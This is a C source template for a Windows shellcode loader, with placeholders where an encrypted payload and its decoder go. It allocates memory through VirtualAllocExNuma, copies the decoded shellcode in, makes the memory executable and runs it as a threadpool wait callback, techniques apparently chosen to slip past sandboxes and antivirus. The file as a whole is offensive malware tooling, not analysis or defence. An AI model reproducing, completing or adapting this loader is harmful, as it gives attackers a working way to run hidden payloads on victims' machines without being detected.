#include <windows.h>
#include <stdio.h>
#include <threadpoolapiset.h>
#include "base64.h"
#include "syscall.h"


char Ciphertext[] = "<Ciphertext>";

int main() {
	HANDLE hEvent;
	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));
	
	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	PTP_WAIT ptp_w = CreateThreadpoolWait((PTP_WAIT_CALLBACK)addr, NULL, NULL);


	SetThreadpoolWait(ptp_w, hEvent, 0);

	SetEvent(hEvent);
	WaitForThreadpoolWaitCallbacks(ptp_w, FALSE);
	SetEvent(hEvent);
	while (TRUE)
	{
		Sleep(9000);
	}


}